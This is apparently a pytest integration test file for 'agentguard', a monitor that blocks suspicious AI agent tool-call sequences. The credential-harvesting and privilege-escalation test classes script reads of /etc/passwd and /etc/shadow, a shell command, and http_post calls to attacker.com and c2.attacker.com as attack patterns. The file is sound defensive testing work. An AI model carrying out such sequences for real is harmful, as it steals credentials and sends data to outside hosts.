"""
Integration tests: L4 adaptive engine through the Guardian.

Tests real attack sequences via validate_tool_call — no mocks on the L4 stack.
All other guards disabled so only L4 fires.
"""

import os
import tempfile

import pytest

from agentguard.exceptions import ToolCallBlockedError
from agentguard.guardian import Guardian

# Low thresholds so IOA graph scores reliably cross deny in cold start.
# graph_score for a matched IOA pattern ≈ 0.10 (node) + 0.30 (edge) + 0.5*risk_delta
# PrivEsc (0.95): graph_score ≈ 0.875 -> fused = 0.40*0.875 = 0.35 > deny_threshold=0.30
L4_ONLY_CONFIG = """
global:
  mode: enforce
  log_level: minimal
input_security:
  prompt_shields:
    enabled: false
  content_filters:
    block_toxicity: false
    block_violence: false
    block_self_harm: false
tool_firewall:
  enabled: false
behavioral_monitoring:
  enabled: false
l4_adaptive:
  enabled: true
  cold_start_threshold: 3
  elevate_threshold: 0.20
  deny_threshold: 0.30
"""


def _guardian():
    fd, path = tempfile.mkstemp(suffix=".yaml")
    with os.fdopen(fd, "w") as f:
        f.write(L4_ONLY_CONFIG)
    g = Guardian(path)
    os.unlink(path)
    return g


def _ctx(role="analyst", sensitivity=0, task_id="task-1"):
    return {"agent_role": role, "resource_sensitivity": sensitivity, "task_id": task_id}


class TestBenignWorkflow:
    def test_single_read_is_allowed(self):
        """A single benign file_read from an analyst on a public resource passes."""
        g = _guardian()
        result = g.validate_tool_call("file_read", {"path": "/public/report.txt"}, _ctx())
        assert result.is_safe is True


class TestPolicyDeny:
    def test_critical_resource_denied_immediately(self):
        """
        role='admin' (not in readonly_public) + resource_sensitivity=3 with no hitl_approved
        hits critical_deny_no_hitl. L4b never runs (risk_score=1.0 short-circuit).
        """
        g = _guardian()
        with pytest.raises(ToolCallBlockedError) as exc:
            g.validate_tool_call(
                "file_read",
                {"path": "/secrets/prod.key"},
                _ctx(role="admin", sensitivity=3),
            )
        assert "l4 adaptive" in str(exc.value).lower()

    def test_critical_resource_contains_risk_info(self):
        """Blocked reason includes risk score and policy."""
        g = _guardian()
        with pytest.raises(ToolCallBlockedError) as exc:
            g.validate_tool_call("admin_call", {}, _ctx(role="admin", sensitivity=3))
        msg = str(exc.value)
        assert "risk=1.00" in msg
        assert "DENY" in msg


class TestCredentialHarvestingAttack:
    """
    IOA: file_read -> file_read -> http_post (risk_delta=0.90).
    The first two calls are benign. The third completes the pattern and
    the graph scorer fires, pushing the fused score above deny_threshold.
    """

    def test_first_two_reads_allowed(self):
        g = _guardian()
        ctx = _ctx()
        r1 = g.validate_tool_call("file_read", {"path": "/etc/passwd"}, ctx)
        r2 = g.validate_tool_call("file_read", {"path": "/etc/shadow"}, ctx)
        assert r1.is_safe is True
        assert r2.is_safe is True

    def test_exfil_post_triggers_deny(self):
        g = _guardian()
        ctx = _ctx()
        g.validate_tool_call("file_read", {"path": "/etc/passwd"}, ctx)
        g.validate_tool_call("file_read", {"path": "/etc/shadow"}, ctx)
        with pytest.raises(ToolCallBlockedError):
            g.validate_tool_call("http_post", {"url": "https://attacker.com/collect"}, ctx)


class TestPrivilegeEscalationAttack:
    """
    IOA: shell_exec -> file_write -> http_post (risk_delta=0.95).
    Highest-risk IOA pattern — reliably crosses deny_threshold=0.30.
    """

    def test_shell_exec_and_write_allowed(self):
        g = _guardian()
        ctx = _ctx(role="executor")
        r1 = g.validate_tool_call("shell_exec", {"cmd": "id"}, ctx)
        r2 = g.validate_tool_call("file_write", {"path": "/tmp/output.sh"}, ctx)
        assert r1.is_safe is True
        assert r2.is_safe is True

    def test_exfil_completes_priv_esc_pattern(self):
        g = _guardian()
        ctx = _ctx(role="executor")
        g.validate_tool_call("shell_exec", {"cmd": "id"}, ctx)
        g.validate_tool_call("file_write", {"path": "/tmp/output.sh"}, ctx)
        with pytest.raises(ToolCallBlockedError):
            g.validate_tool_call("http_post", {"url": "https://c2.attacker.com"}, ctx)


class TestSessionIsolation:
    """
    Each Guardian instance gets its own SessionGraphScorer.
    Triggering an IOA on one instance must not affect another.
    """

    def test_fresh_instance_not_poisoned_by_prior_attack(self):
        # Instance A: trigger PrivEsc IOA
        g_attack = _guardian()
        ctx = _ctx(role="executor")
        g_attack.validate_tool_call("shell_exec", {"cmd": "id"}, ctx)
        g_attack.validate_tool_call("file_write", {"path": "/tmp/x"}, ctx)
        with pytest.raises(ToolCallBlockedError):
            g_attack.validate_tool_call("http_post", {"url": "https://attacker.com"}, ctx)

        # Instance B: benign read should still pass
        g_clean = _guardian()
        result = g_clean.validate_tool_call("file_read", {"path": "/public/data.txt"}, _ctx())
        assert result.is_safe is True
